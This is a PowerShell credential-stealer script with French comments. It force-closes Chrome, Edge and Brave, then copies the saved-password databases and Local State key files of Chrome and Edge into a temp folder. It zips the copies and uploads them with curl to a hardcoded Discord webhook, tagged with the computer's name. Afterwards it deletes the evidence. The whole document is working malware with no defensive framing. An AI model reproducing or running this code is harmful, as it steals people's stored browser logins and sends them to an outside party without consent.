$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

# Kill browsers
taskkill /F /IM chrome.exe,msedge.exe,brave.exe 2>$null
Start-Sleep -Seconds 2

# Setup
cd $env:TEMP
Remove-Item Loot -Recurse -Force -EA 0
mkdir Loot -Force | Out-Null

# Chemins
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeRoot = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveRoot = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"

# Copier Chrome
if (Test-Path "$chromePath\Login Data") {
    Copy-Item "$chromePath\Login Data" "Loot\Chrome_Passwords.db" -EA 0
}
if (Test-Path "$chromeRoot\Local State") {
    Copy-Item "$chromeRoot\Local State" "Loot\Chrome_Local_State" -EA 0
}

# Copier Edge
if (Test-Path "$edgePath\Login Data") {
    Copy-Item "$edgePath\Login Data" "Loot\Edge_Passwords.db" -EA 0
}
if (Test-Path "$edgeRoot\Local State") {
    Copy-Item "$edgeRoot\Local State" "Loot\Edge_Local_State" -EA 0
}


# Compresser
Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force

# Upload
curl.exe -F "file=@loot.zip" -F "content=**Loot from $env:COMPUTERNAME**" $wh

# Cleanup
Start-Sleep -Seconds 3
Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0


